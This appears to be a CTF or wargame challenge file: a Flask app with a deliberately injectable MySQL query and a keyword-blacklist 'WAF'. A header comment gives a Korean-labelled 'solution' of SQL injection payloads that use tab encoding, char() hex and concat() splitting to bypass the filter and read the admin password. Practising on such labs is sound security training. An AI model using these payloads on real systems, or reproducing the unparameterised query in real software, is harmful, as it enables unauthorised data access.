'''
solution..!


이건 진짜 됨
guest';%09%23

'%09%23ASCII(111,114)%09uid='test%23


guest'%09char(0x6F,0x72)%09uid='test
guest'%09%4F%52uid='test';
guest'%09uid='test'%09%00%00%09%00


'concat('uni','on')%09concat('sele','ct)%09null,upw,null`concat('fr','om')`user`where`uid=concat('ad','min')`#
'concat('uni','on')%09concat('sele','ct)%09null,upw,null%09concat('fr','om')%09user%09where%09uid=concat('ad','min')#
'char(0x75,0x6E,0x69,0x6F,0x6E)%09char(0x73,0x65,0x6C,0x65,0x63,0x74)%09null,'1',null%09#
'''
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', '0.0.0.0')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<pre>{result}</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+'] # \v, \f 
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template


if __name__ == '__main__':
    app.run(host='0.0.0.0')
